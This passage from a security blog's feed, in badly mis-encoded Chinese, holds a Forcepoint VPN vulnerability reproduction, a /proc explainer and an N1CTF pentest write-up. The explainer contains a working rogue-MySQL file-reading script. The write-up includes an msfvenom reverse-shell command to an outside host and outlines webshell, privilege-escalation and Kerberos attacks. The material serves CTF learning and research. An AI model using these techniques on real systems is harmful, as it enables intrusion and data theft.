    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2019-09-27 0:03:55<br><img src="/wallpaper/anime.jpg" alt></p></blockquote><h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>ç¾¤é‡Œå¸ˆå‚…ä¼ äº†ä¸€ç¯‡æ¼æ´è¯¦æƒ…ï¼Œå¦‚ä¸‹ï¼š<br><a href="https://www.4hou.com/vulnerable/20515.html" target="_blank" rel="noopener">https://www.4hou.com/vulnerable/20515.html</a></p><p>å…¶ä¸­ç¿»åˆ°è¿™ä¸ªçš„æ—¶å€™ï¼š<br><img src="/CVE-2019-6145  Forcepoint VPN.resources/68BEF323-598F-4DF8-80DB-1D6793F8D6B7.png" alt="a80184c994256c62b68309752428a068"></p><p>è¿™ä¸å°±æ˜¯ç™½åŠ é»‘ä¹ˆ..è¿˜èƒ½è‡ªå¯ï¼Œå²‚ä¸ç¾å“‰ï½</p><h2 id="0x01-æ¼æ´å¤ç°"><a href="#0x01-æ¼æ´å¤ç°" class="headerlink" title="0x01 æ¼æ´å¤ç°"></a>0x01 æ¼æ´å¤ç°</h2><h3 id="å½±å“ç‰ˆæœ¬"><a href="#å½±å“ç‰ˆæœ¬" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h3><blockquote><p>Forcepoint VPN Windows Client &lt; 6.6.1</p></blockquote><h3 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h3><p><img src="/CVE-2019-6145  Forcepoint VPN.resources/0F0DCA0F-6513-4706-99ED-496E97F42D6E.png" alt="b565f7eb7008dae50e9cffef5140d7b0"><br><img src="/CVE-2019-6145  Forcepoint VPN.resources/ED60C5CC-3A68-4AD1-8D96-591E1BC1ADBE.png" alt="240c6b110481cf8ad45fadf90f90bd38"></p><p>å®‰è£…çš„æ—¶å€™ä¼šè°ƒç”¨<code>msiexec.exe</code>ï¼Œä½¿ç”¨é©±åŠ¨åŠ è½½<code>NT/SYSTEM</code></p><p>ç„¶åä¿è¯è‡ªå¯åŠ¨ï¼Œæ‰€ä»¥åªè¦æˆ‘ä»¬èƒ½æ‘¸åˆ°è·¯å¾„å°±èƒ½æŒä¹…æ§åˆ¶</p><p>æ‰“å¼€ç¨‹åºï¼Œæˆ‘ä»¬å‘ç°ä»–ä¼šå»æŸ¥è¯¢ä¸€äº›ä¸å­˜åœ¨çš„ç›®å½•å’Œç¨‹åº<br><img src="/CVE-2019-6145  Forcepoint VPN.resources/A0273E78-14DF-4D99-9191-69B446967C1A.png" alt="9cb5f6b66d8398fa197331f3ac360091"></p><p><img src="/CVE-2019-6145  Forcepoint VPN.resources/02015B80-4E63-4E3F-9636-B2D3B7BC126A.png" alt="e556b1bc632f8bc055b6631bab814364"><br><img src="/CVE-2019-6145  Forcepoint VPN.resources/0900E779-7DB6-4822-B27D-D62C34A17472.png" alt="8c750183f70b3a62663bdfcf5d0b7be2"></p><h2 id="0x02-æ¼æ´åŸç†"><a href="#0x02-æ¼æ´åŸç†" class="headerlink" title="0x02 æ¼æ´åŸç†"></a>0x02 æ¼æ´åŸç†</h2><p>çœ‹è¿™ä¸ªå°±å¥½äº†<br><a href="https://www.4hou.com/vulnerable/20515.html" target="_blank" rel="noopener">https://www.4hou.com/vulnerable/20515.html</a></p><p>æš´é£å“­æ³£ï¼Œä¸ä¼š</p><p>ï¼ˆæˆ‘æ˜¯ä¸€ä¸ªæ²¡æœ‰æ„Ÿæƒ…çš„å¤ç°æœºå™¨ï¼‰</p><h2 id="0x03-å…æ€"><a href="#0x03-å…æ€" class="headerlink" title="0x03 å…æ€"></a>0x03 å…æ€</h2><p><img src="/CVE-2019-6145  Forcepoint VPN.resources/44A7E077-1986-4B16-A52D-1287E84C837A.png" alt="c722b31e90a0fd3ac2ff973fe6445c7a"></p><p><img src="/CVE-2019-6145  Forcepoint VPN.resources/6DB73CBB-5076-49AE-A1A7-613CF68C0F8A.png" alt="aee18db9dbe77ac4edcca72af7e3d1b9"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2019-09-27 0:03:55&lt;br&gt;&lt;img src=&quot;/wallpaper/anime.jpg&quot; alt&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x00-å‰è¨€&quot;&gt;&lt;a
      
    
    </summary>
    
      <category term="æ¼æ´å¤ç°" scheme="http://patrilic.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="Forcepoint VPN" scheme="http://patrilic.top/tags/Forcepoint-VPN/"/>
    
  </entry>
  
  <entry>
    <title>æµ…è°ˆ Linuxç³»ç»Ÿ proc</title>
    <link href="http://patrilic.top/2019/09/11/%E6%B5%85%E8%B0%88%20Linux%E7%B3%BB%E7%BB%9F%20Proc/"/>
    <id>http://patrilic.top/2019/09/11/æµ…è°ˆ Linuxç³»ç»Ÿ Proc/</id>
    <published>2019-09-10T16:44:23.000Z</published>
    <updated>2019-09-10T16:59:01.747Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2019-9-11 0:44:23<br><img src="/wallpaper/thumb-1920-608362.jpg" alt></p></blockquote><h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>æˆ‘ä»¬ç»å¸¸åœ¨CTFæ¯”èµ›é‡Œï¼Œæˆ–è€…å®é™…æ¸—é€é‡Œï¼Œä½¿ç”¨åˆ°<code>/proc</code>è¿™ä¸ªç›®å½•ï¼Œæ¯”å¦‚å¸¸å¸¸åˆ©ç”¨<code>/proc/self/cwd</code>æ¥è®¿é—®è¿›ç¨‹ä¸­çš„æ–‡ä»¶ï¼Œä½¿ç”¨<code>/proc/self/environ</code>è¯»å–ç³»ç»Ÿçš„ç¯å¢ƒå˜é‡ç­‰</p><h2 id="0x01-Proc-åˆ°åº•æ˜¯ä¸ªä»€ä¹ˆä¸œè¥¿"><a href="#0x01-Proc-åˆ°åº•æ˜¯ä¸ªä»€ä¹ˆä¸œè¥¿" class="headerlink" title="0x01 Proc åˆ°åº•æ˜¯ä¸ªä»€ä¹ˆä¸œè¥¿"></a>0x01 Proc åˆ°åº•æ˜¯ä¸ªä»€ä¹ˆä¸œè¥¿</h2><p>å®é™…ä¸Šæˆ‘ä»¬åœ¨ä»»ä½•çš„GUN/Linuxæ“ä½œç³»ç»Ÿé‡Œï¼Œéƒ½èƒ½æ‰¾åˆ°è¿™ä¸ªç›®å½•ï¼Œå¹¶ä¸”é‡Œé¢å­˜åœ¨å¤§é‡ç›®å½•<br><img src="/æµ…è°ˆ Linuxç³»ç»Ÿ Proc.resources/70DE7AC6-D2C4-42A8-8A78-3F631B6515A6.png" alt="f48d8c5a7f26e7be272c7c36a0224e65"><br>ä½†æ˜¯å¦‚æœï¼Œæˆ‘ä»¬ä½¿ç”¨ <code>ls -al</code>æ¥æŸ¥çœ‹<br><img src="/æµ…è°ˆ Linuxç³»ç»Ÿ Proc.resources/F0A39E32-2167-47D3-B6B7-C76BD67C7F3D.png" alt="e39161263565785f4d27eea36ccec527"></p><p>å¯ä»¥çœ‹åˆ°ç»å¤§éƒ¨åˆ†æ–‡ä»¶å¤§å°ä¸º0</p><p>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥ä½¿ç”¨catå‘½ä»¤è·å–å…¶ä¸­çš„å¤§é‡ä¿¡æ¯<br><img src="/æµ…è°ˆ Linuxç³»ç»Ÿ Proc.resources/C6AC528D-6694-4F8C-A7D8-DD139C74A308.png" alt="cc6935b581357039fa948356e6cc9ea9"></p><p>ä¸ºä»€ä¹ˆ0å­—èŠ‚è¿˜èƒ½å­˜æœ‰å†…å®¹å‘¢</p><p>è¿™é‡Œæåˆ°ä¸€ä¸ªæ¦‚å¿µï¼šæ–‡ä»¶ç³»ç»Ÿ<br>ç»´åŸºç™¾ç§‘-&gt;<a href="https://zh.wikipedia.org/zh-hans/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/Procfs</a></p><p>è€Œprocåœ¨Unixé‡Œå¸¸å¸¸è¢«ç§°ä¸ºprocfs -&gt; proc file system<br>å®ƒåŒ…å«ä¸€ä¸ªä¼ªæ–‡ä»¶ç³»ç»Ÿï¼ˆå¯åŠ¨æ—¶åŠ¨æ€ç”Ÿæˆçš„æ–‡ä»¶ç³»ç»Ÿï¼‰ï¼Œç”¨äºé€šè¿‡å†…æ ¸è®¿é—®è¿›ç¨‹ä¿¡æ¯ã€‚è¿™ä¸ªæ–‡ä»¶ç³»ç»Ÿé€šå¸¸è¢«æŒ‚è½½åˆ° /proc ç›®å½•ã€‚ç”±äº /proc ä¸æ˜¯ä¸€ä¸ªçœŸæ­£çš„æ–‡ä»¶ç³»ç»Ÿï¼Œå®ƒä¹Ÿå°±ä¸å ç”¨å­˜å‚¨ç©ºé—´ï¼Œåªæ˜¯å ç”¨æœ‰é™çš„å†…å­˜ã€‚</p><p>ç»´åŸºç™¾ç§‘-&gt;<a href="https://zh.wikipedia.org/wiki/Procfs" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/Procfs</a></p><p>æ‰€ä»¥è¯´ï¼Œå…¶å®/procç›®å½•æ›´å¤šçš„æ˜¯èµ·åˆ°ä¸€ä¸ªç±»ä¼¼äºæ¥å£çš„ä½œç”¨ï¼Œå½“æˆ‘ä»¬ä½¿ç”¨catå‘½ä»¤è·å–æ—¶ï¼Œå®ƒä¼šä»å†…å­˜ä¸­è·å–ä¿¡æ¯ï¼Œæ¥è¿”å›ç»™ç”¨æˆ·ï¼Œè€Œç›®å½•ä¸­çš„æ•°å­—ï¼Œå…¶å®å°±æ˜¯PIDå·ã€‚</p><ul><li>/proc/$PID/cmdline  å¯åŠ¨è¿›ç¨‹æ—¶æ‰§è¡Œçš„å‘½ä»¤ </li><li>/proc/$PID/environ  è¯¥æ–‡ä»¶ä¿å­˜è¿›ç¨‹çš„ç¯å¢ƒå˜é‡ </li><li>/proc/$PID/cwd  ä¸€ä¸ªç¬¦å·è¿æ¥, æŒ‡å‘è¿›ç¨‹å½“å‰çš„å·¥ä½œç›®å½• </li><li>/proc/$PID/exe  ä¸€ä¸ªç¬¦å·è¿æ¥, æŒ‡å‘è¢«æ‰§è¡Œçš„äºŒè¿›åˆ¶ä»£ç  </li><li>/proc/$PID/fd  è¿›ç¨‹æ‰€æ‰“å¼€çš„æ¯ä¸ªæ–‡ä»¶éƒ½æœ‰ä¸€ä¸ªç¬¦å·è¿æ¥åœ¨è¯¥å­ç›®å½•é‡Œ, ä»¥æ–‡ä»¶æè¿°ç¬¦å‘½å, è¿™ä¸ªåå­—å®é™…ä¸Šæ˜¯æŒ‡å‘çœŸæ­£çš„æ–‡ä»¶çš„ç¬¦å·è¿æ¥ </li><li>/proc/$PID/attr  è¿›ç¨‹çš„å±æ€§ </li></ul><h2 id="0x02-proc-self"><a href="#0x02-proc-self" class="headerlink" title="0x02 /proc/self"></a>0x02 /proc/self</h2><p>ç›¸å¯¹äºè¿›ç¨‹PIDï¼Œæˆ‘ä»¬åœ¨å®æˆ˜çš„æ–‡ä»¶è¯»å–ä¸­ï¼Œæ›´å¤šä½¿ç”¨çš„æ˜¯<code>/proc/self</code>ç›®å½•ã€‚<br>åœ¨<code>stackexchange</code>æœ‰ä¸€ä¸ªè®¨è®ºï¼Œ<br><a href="https://unix.stackexchange.com/questions/333225/which-process-is-proc-self-for" target="_blank" rel="noopener">https://unix.stackexchange.com/questions/333225/which-process-is-proc-self-for</a></p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œå…¶å®<code>/proc/self</code> æ˜¯æŒ‡å‘å½“å‰è¿›ç¨‹çš„å†…å­˜</p><p>æ¯”å¦‚ä¹‹å‰æŠ¤ç½‘æ¯2019çš„ä¸€é“åˆ©ç”¨ MySQL LOAD DATAç‰¹æ€§è¯»å–æ–‡ä»¶ï¼Œè®©phpè¿œç¨‹è¿æ¥åˆ°æˆ‘ä»¬çš„å®¢æˆ·ç«¯ï¼Œç„¶åå‘é€å‘½ä»¤ï¼Œç”±äºåœ¨è¿œç¨‹æœåŠ¡å™¨æ˜¯ä½¿ç”¨apacheè¿›ç¨‹æ¥è¿æ¥ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è¯»å–åˆ°<code>/proc/self/cwd/index.php</code><br><img src="/æµ…è°ˆ Linuxç³»ç»Ÿ Proc.resources/0627C538-2DED-428D-9E06-F30859D58EE8.png" alt="c6ca5efffe4e45310d735cfbe4e70b8e"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8 </span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.basicConfig(level=logging.DEBUG)</span><br><span class="line"></span><br><span class="line">filename=<span class="string">"/proc/self/cwd/index.php"</span></span><br><span class="line">sv=socket.socket()</span><br><span class="line">sv.bind((<span class="string">""</span>,<span class="number">3306</span>))</span><br><span class="line">sv.listen(<span class="number">5</span>)</span><br><span class="line">conn,address=sv.accept()</span><br><span class="line">logging.info(<span class="string">'Conn from: %r'</span>, address)</span><br><span class="line">conn.sendall(<span class="string">"\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x35\x33\x00\x17\x00\x00\x00\x6e\x7a\x3b\x54\x76\x73\x61\x6a\x00\xff\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x76\x21\x3d\x50\x5c\x5a\x32\x2a\x7a\x49\x3f\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00"</span>)</span><br><span class="line">conn.recv(<span class="number">9999</span>)</span><br><span class="line">logging.info(<span class="string">"auth okay"</span>)</span><br><span class="line">conn.sendall(<span class="string">"\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00"</span>)</span><br><span class="line">conn.recv(<span class="number">9999</span>)</span><br><span class="line">logging.info(<span class="string">"want file..."</span>)</span><br><span class="line">wantfile=chr(len(filename)+<span class="number">1</span>)+<span class="string">"\x00\x00\x01\xFB"</span>+filename</span><br><span class="line">conn.sendall(wantfile)</span><br><span class="line">content=conn.recv(<span class="number">9999</span>)</span><br><span class="line">logging.info(content)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure><p>tip: å½“æ‰¾ä¸åˆ°ç½‘ç«™è·¯å¾„çš„æ—¶å€™ï¼Œå¯ä»¥åˆ©ç”¨<code>/proc/self/cwd</code>ç›®å½•æ¥è¯»å–apacheè¿›ç¨‹çš„phpæ–‡ä»¶æºç </p><h2 id="0x03-ç›¸å…³é“¾æ¥ğŸ”—"><a href="#0x03-ç›¸å…³é“¾æ¥ğŸ”—" class="headerlink" title="0x03 ç›¸å…³é“¾æ¥ğŸ”—"></a>0x03 ç›¸å…³é“¾æ¥ğŸ”—</h2><p><a href="https://blog.csdn.net/goodluckwhh/article/details/17010029" target="_blank" rel="noopener">https://blog.csdn.net/goodluckwhh/article/details/17010029</a><br><a href="https://unix.stackexchange.com/questions/333225/which-process-is-proc-self-for" target="_blank" rel="noopener">https://unix.stackexchange.com/questions/333225/which-process-is-proc-self-for</a><br><a href="https://www.cnblogs.com/youxin/p/4980058.html" target="_blank" rel="noopener">https://www.cnblogs.com/youxin/p/4980058.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2019-9-11 0:44:23&lt;br&gt;&lt;img src=&quot;/wallpaper/thumb-1920-608362.jpg&quot; alt&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;
      
    
    </summary>
    
      <category term="linux" scheme="http://patrilic.top/categories/linux/"/>
    
    
      <category term="proc" scheme="http://patrilic.top/tags/proc/"/>
    
  </entry>
  
  <entry>
    <title>N1CTF Pentest N1ctf2019.lab Write-up</title>
    <link href="http://patrilic.top/2019/09/10/N1CTF%20%20Pentest%20N1ctf2019.lab%20Write-up/"/>
    <id>http://patrilic.top/2019/09/10/N1CTF  Pentest N1ctf2019.lab Write-up/</id>
    <published>2019-09-09T17:20:33.000Z</published>
    <updated>2019-09-09T15:03:25.597Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2019-09-10 01:20:33<br><img src="/wallpaper/thumb-1920-584470.jpg" alt></p></blockquote><h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>scanfå¤§å¸ˆå‚…çš„é¢˜ï¼Œtql..orz<br>è¢«hayaå¸ˆå‚…å¸¦ç€åšäº†è€åŠå¤©ï¼Œæ‰è‚å‡ºæ¥ç¬¬ä¸€é¢˜ï¼Œç„¶ååé¢å› ä¸ºå¤ªå¤šäººæ…å±æ²¡åŠæ³•åšäº†..</p><p>ç°åœ¨æ¯”èµ›ç»“æŸäº†ï¼Œè¶ç€å¸ˆå‚…è¿˜æ²¡å…³ç¯å¢ƒå¤ç›˜ä¸€ä¸‹</p><h2 id="0x01-Step-1"><a href="#0x01-Step-1" class="headerlink" title="0x01 Step 1"></a>0x01 Step 1</h2><p><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/8B6AEA77-BC71-4524-AB3E-03682BE9AA2B.png" alt="bfb092323f5fb9388df881f67790c5fa"></p><p>å…¥å£ip:<br>ç®€å•æ¢æµ‹ä¸€ä¸‹ç«¯å£ï¼š47.52.129.242<br><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/F08CCB53-2BEA-45DC-B0DA-4F2BC882EB53.png" alt="dd0b6c61e3921224e34a939bed7af5db"></p><p>å‘ç°å¼€äº†ProFTPD 1.3.5</p><p>ç¨å¾®googoleä¸€ä¸‹ï¼Œå‘ç°å­˜åœ¨ä»»æ„æ–‡ä»¶æ‹·è´æ¼æ´ï¼ˆCVE-2019-12815ï¼‰</p><p>ä½¿ç”¨ncftp è¿æ¥<br><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/0E212818-FD0C-4FF0-A6FC-FB489AA4123A.png" alt="926bccdda31f92e2756d6d79922d0b74"></p><p>å…¶å®è¿˜æ˜¯è›®å¡çš„â€¦<br><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/F29833FD-DAE3-44BF-B4D4-D52E08039466.png" alt="13ec778cbd22acd27d61aa2cddf1bf40"></p><p>ç„¶åæˆ‘ä»¬æŠŠmsgæ–‡ä»¶å†™å…¥åˆ°patrilic.phpé‡Œ</p><p><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/26BF5290-F82E-4BF0-83C7-4919069AB43D.png" alt="c33df3cd9728cf93922824154027574a"></p><blockquote><p>PS: å¥½åƒWindowsè¿æ¥éœ€è¦å¯†ç ï¼Œç„¶åTOP1000å­—å…¸å°±å¯ä»¥çˆ†ç ´å‡ºæ¥ï¼Œç”¨æˆ·ftp å¯†ç  mustang</p></blockquote><p>æ‰€ä»¥ç°åœ¨æˆ‘ä»¬æœ‰ä¸€ä¸ª<code>www-data</code>æƒé™çš„webshellï¼Œå…ˆåå¼¹ä¸€ä¸ªshellåˆ°æˆ‘ä»¬çš„vpsä¸Š</p><p>å…ˆæŸ¥çœ‹ä¸€ä¸‹å†…æ ¸ç‰ˆæœ¬ï¼š<br><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/675A849D-69D2-4096-86FB-E966A8C08EB9.png" alt="82bb6955321a5530c3bf9a12277d6fb0"></p><p>okï¼Œä½¿ç”¨<code>msfvenom</code>ç”Ÿæˆä¸€ä¸ªx64çš„linux reverse_shellæœ¨é©¬ï¼Œæ”¾åœ¨webç›®å½•ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom --payload  linux/x64/shell_reverse_tcp LHOST=45.xx.xx.xx LPORT=7778 -f elf -o /home/wwwroot/default/test.elf</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ç”¨file_put_contents + file_get_contentså°†æ–‡ä»¶ä¸‹è½½åˆ°/tmpç›®å½•ä¸‹<br><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/20EF13D9-B920-4C9F-84FE-FCD4AF273E9E.png" alt="d6ff181f69ac7604fe5c637ac30deb64"></p><p><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/0EF41EEA-CA1B-43E0-871F-38F60DB606F6.png" alt="954843a51658096b9c4c38ff57e7b6fa"></p><p>ç„¶åç»™ä¸ªæ‰§è¡Œæƒé™ å°±å¯ä»¥å¼¹å›shelläº†</p><p><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/123A148B-B113-4DD5-AFCB-75FA44314F4F.png" alt="bbf5cad7c673e608440379b7ff6ff091"></p><p>ç„¶åç»™å®ƒå‡çº§ä¸€ä¸‹ï¼Œææˆmeterpreter session<br><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/E1D7AACB-FC79-43DA-8B32-CEB073860A57.png" alt="aa30ede9c3f038c1e9cd13dbca800839"></p><p>ææƒçš„è¯ï¼Œå› ä¸ºç»™äº†æç¤ºå˜›ï¼Œsnapï¼Œä¹Ÿèƒ½æ¯”è¾ƒå®¹æ˜“æƒ³åˆ°æ˜¯å¹´åˆé‚£ä¸ªæ¼æ´</p><p>CVE-2019-7304<br>githubä¸Šä¹Ÿæœ‰exp:<a href="https://github.com/initstring/dirty_sock" target="_blank" rel="noopener">https://github.com/initstring/dirty_sock</a></p><p>ç„¶åå› ä¸ºæœ‰å¸ˆå‚…æ…å±..å°±æŠŠsnapå‡çº§äº†ï¼Œå¯¼è‡´æ²¡æç¤ºçš„æ—¶å€™ï¼Œå¾ˆå¤šå¸ˆå‚…ä¸€è„¸æ‡µé€¼<br><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/8C6E7428-C46F-428F-86BA-21E122C7B106.png" alt="e1f33edcc2a556e7ed15a6c1bae0be25"></p><p>ä¸è¿‡snapæ˜¯åœ¨18.04çš„ç‰ˆæœ¬ä¹‹åæ‰ä¼šè‡ªå¸¦ï¼Œæ‰€ä»¥åœ¨è¿™å«Œç–‘è¿˜æ˜¯æ¯”è¾ƒå¤§çš„</p><p>æˆ‘ä»¬å…ˆç”¨pythonå¾—åˆ°ä¸€ä¸ªåŠäº’å¼shell<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">"import pty;pty.spawn('/bin/bash')"</span></span><br></pre></td></tr></table></figure></p><p><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/19F30D2A-BF2B-4F89-91CB-9CB7DCE38BC9.png" alt="b95386722c3c3a34961c7b8528cc83c4"></p><p>å¯ä»¥çœ‹åˆ°å…¶å®ï¼Œè¿™ä¸ªexpä¼šç”Ÿæˆä¸€ä¸ª<code>dirty_sock</code>ç”¨æˆ·ï¼Œå¹¶ä¸”å¯†ç å°±æ˜¯<code>dirty_sock</code><br><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/0F9D34D8-20D2-443B-B50D-33EC15E10CF4.png" alt="9f889bd4914086f7264e6899039dd6ec"></p><p>Get the flag: N1CTF{ImpOrtant_P0int3_4de0e}</p><h2 id="0x02-Step-2"><a href="#0x02-Step-2" class="headerlink" title="0x02 Step 2"></a>0x02 Step 2</h2><p><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/61C9F7F2-E91B-47E0-B3D4-B85F65BBEC53.png" alt="7a4b924e2833d1fcb3650d3014e8dcd4"></p><p>psè·å–è¿›ç¨‹åˆ—è¡¨<br><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/0B6BE438-DB34-4FA6-AFFC-3A0377150FB8.png" alt="131de33d1136f8bf8d9186506a6e97f0"></p><p><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/77BB4EC0-21B9-42AD-9EF3-38792F5D2DEC.png" alt="97c856f03e9a74098462c37adcfc9e6f"></p><p>å¯ä»¥çœ‹åˆ°devä¸Šæœ‰ä¸€ä¸ªåŸŸç”¨æˆ·<br><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/2481FCC8-41D6-40BA-BC15-7E4AC208D4ED.png" alt="cd1e782d5470e4ef6206fffc7b86bbc6"></p><p>ä½¿ç”¨meterpreteråŠ è½½ä¸€ä¸ªpowerview.ps1æ¥å¸®åŠ©æˆ‘ä»¬ä¿¡æ¯æœé›†</p><p>æ³¨æ„åœ¨ç°åœ¨çš„branché‡Œæ˜¯æ²¡æœ‰Get-DomainUserç­‰å‡½æ•°çš„ï¼Œä½¿ç”¨<br><a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1#L4906" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1#L4906</a></p><p><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/545FAF70-7345-4667-8704-FB4244EBA3D2.png" alt="03048e40dac0352715cfbd422a7a75b6"></p><p>ä»¥ä¸‹çœç•¥1000å­—(å°±æ˜¯å¸¸è§„çš„Get-DomainUserç­‰è¿›è¡Œæœé›†)</p><p>é€šè¿‡ä¿¡æ¯æœé›†ï¼Œæˆ‘ä»¬è·å–åˆ°äº†å­˜åœ¨ä¸€ä¸ªbackup Server<br><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/A6F837F7-5B9D-4222-8D72-6860DE27F023.png" alt="e7ef96141c9817a0d3369e74910e1a32"></p><p>è°ƒç”¨<code>Invoke-Kerberoast</code>è·å–SPNå¯†æ–‡<br><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/4A0FA7B5-A860-4CEA-BF81-7ED94637DF8B.png" alt="99c1cfebd9372ddf839cd407ca4099d9"><br>è§£å¯†ï¼š P@ssword123</p><p>ç„¶ååé¢å°±æ˜¯çº¦æŸå§”æ´¾ï¼Œææƒæ‹¿åˆ°\backup.n1ctf2019.lab\backupfile\DCServerçš„è®¿é—®æƒé™</p><p>é‡Œé¢å­˜æœ‰æ³¨å†Œè¡¨å¤‡ä»½ï¼Œä½¿ç”¨impacketå¥—ä»¶è§£å¯†åæ‹¿åˆ°æœ¬åœ°ç®¡ç†å‘˜hash</p><p>ç„¶åé“¶ç¥¨æ®ï¼Œé‡‘ç¥¨æ®ï¼Œæ‹¿åˆ°DCæƒé™ï¼Œæœ€åæ‹¿åˆ°åŸŸç®¡ç†å‘˜æ¡Œé¢ä¸Šçš„flag</p><h2 id="0x03-æ€»ç»“"><a href="#0x03-æ€»ç»“" class="headerlink" title="0x03 æ€»ç»“"></a>0x03 æ€»ç»“</h2><p>å› ä¸ºåé¢éš§é“å®åœ¨æ˜¯å¤ªä¸ç¨³å®šäº†,sessionç–¯ç‹‚æ‰,ä¸€ç›´åœ¨88è¿™å°æœºå­ä¸Šè½¬æ‚ <br>è™½ç„¶å¥½åƒå°±æˆ‘ä¸€ä¸ªäººåœ¨å¼„<br><img src="/N1CTF  Pentest N1ctf2019.lab Write-up.resources/9359A854-337E-4AB2-BAE2-166F58C570AF.png" alt="91d5a2c55d9806198151c414dd240769"></p><p>vultrçœŸæƒ¨å•Š..</p><p>ç„¶ååé¢çš„çº¦æŸå§”æ´¾ï¼Œå®åœ¨æ˜¯ä¸æ€ä¹ˆç†Ÿæ‚‰ï¼Œè¿˜æ˜¯ç»éªŒå¤ªå°‘..</p><p>æœ€åå®åè†œä¸€æ³¢<code>scanf</code>å¸ˆå‚…ï¼Œä»¥åŠå¸¦æˆ‘é£çš„<code>haya</code>å¸ˆå‚…ï¼Œorz</p><p>å¥‰ä¸Šå®˜æ–¹wpï¼š<br><a href="https://github.com/Nu1LCTF/n1ctf-2019/blob/master/WEB/Pentest_N1CTF2019.lab/README.md" target="_blank" rel="noopener">https://github.com/Nu1LCTF/n1ctf-2019/blob/master/WEB/Pentest_N1CTF2019.lab/README.md</a></p><p>Nu1Lå¤ªå¼ºäº†ï¼Œ ä¹Ÿæ„Ÿè°¢ä¸€æ³¢scanfå¸ˆå‚…å¸¦æ¥è¿™ä¹ˆæœ‰è¶£çš„é¢˜ç›®ï¼ˆä¸è¿‡å¦‚æœæ²¡äººæ…å±çš„è¯è¯´ä¸å®šèƒ½è‚å‡ºæ¥step2 hhhhï¼‰</p><p>æœ€åè¿˜æ˜¯è§‰å¾—ï¼Œè¿‡æ®µæ—¶é—´å¥½å¥½ç ”ç©¶ä¸€æ³¢kerberosï½ï¼Œè¶ç€è¿˜åœ¨å­¦æ ¡hhhh(kekeoéƒ½æ²¡ç”¨è¿‡çš„æˆ‘ å¤ªèœäº†ï¼‰</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
